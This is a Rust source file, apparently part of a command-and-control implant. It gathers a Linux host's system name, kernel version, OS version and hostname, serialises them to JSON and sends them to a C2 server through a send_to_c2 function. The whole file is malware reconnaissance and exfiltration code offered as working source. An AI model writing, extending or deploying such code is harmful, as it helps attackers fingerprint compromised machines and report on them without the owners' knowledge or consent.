use std::error::Error;
use sysinfo::{System};
use serde_json::json;
use crate::connexion::send_to_c2;

pub async fn get_sysinfo_linux() -> Result<(), Box<dyn Error>> {
    let mut sys = System::new();
    sys.refresh_all();

    let json = json!({
        "Name": System::name().ok_or("Failed to fetch System Name")?,
        "Kernel Version": System::kernel_version().ok_or("Failed to fetch Kernel Version")?,
        "System OS Version": System::os_version().ok_or("Failed to fetch OS Version")?,
        "System hostname": System::host_name().ok_or("Failed to fetch Hostname")?,
    });

    let json_string = serde_json::to_string(&json)?;
    send_to_c2(json_string.into_bytes()).await?;

    Ok(())
}
